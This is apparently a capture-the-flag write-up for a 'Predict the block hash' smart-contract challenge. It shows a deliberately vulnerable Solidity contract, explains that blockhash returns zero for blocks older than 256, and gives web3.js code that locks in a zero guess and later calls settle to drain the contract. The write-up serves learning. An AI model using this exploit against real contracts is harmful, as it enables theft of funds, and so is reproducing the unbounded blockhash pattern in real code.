# 08. Predict the block hash

## Target contract

```solidity
pragma solidity ^0.4.21;

contract PredictTheBlockHashChallenge {
    address guesser;
    bytes32 guess;
    uint256 settlementBlockNumber;

    function PredictTheBlockHashChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(bytes32 hash) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = hash;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        bytes32 answer = block.blockhash(settlementBlockNumber);

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}
```

## Vulnerability

The issue here is that there is no bound to the number of blocks between the call to `lockInGuess` and `settle`. From solidity's documentation : "blockhash(uint blockNumber) returns (bytes32): hash of the given block when blocknumber is one of the 256 most recent blocks; otherwise returns zero". So we only need to way 256 blocks between the two calls and we know that the result of `bytes32 answer = block.blockhash(settlementBlockNumber)` will be 0 because `settlementBlockNumber` is further than 256 blocks from the current one.

We can do so very easily :

```js
// Set this variable to the contract address
const contract = "0x6982f3A0833a3a0C7D164E9966a80d106a3F1884";

const data = web3.eth.abi.encodeFunctionCall(
  {
    name: "lockInGuess",
    type: "function",
    inputs: [{ type: "bytes32", name: "hash" }],
  },
  ["0x0000000000000000000000000000000000000000"]
);

await web3.eth.sendTransaction({
  from: accounts[0],
  to: contract,
  data: data,
  value: web3.utils.toWei("1", "ether"),
});
```

Now comes the hardest part, waiting 256 blocks... Then we pass the challenge with :

```js
// Set this variable to the contract address
const contract = "0x6982f3A0833a3a0C7D164E9966a80d106a3F1884";

const data = web3.eth.abi.encodeFunctionCall(
  {
    name: "settle",
    type: "function",
    inputs: [],
  },
  []
);

await web3.eth.sendTransaction({
  from: accounts[0],
  to: contract,
  data: data,
});
```

You can submit the challenge.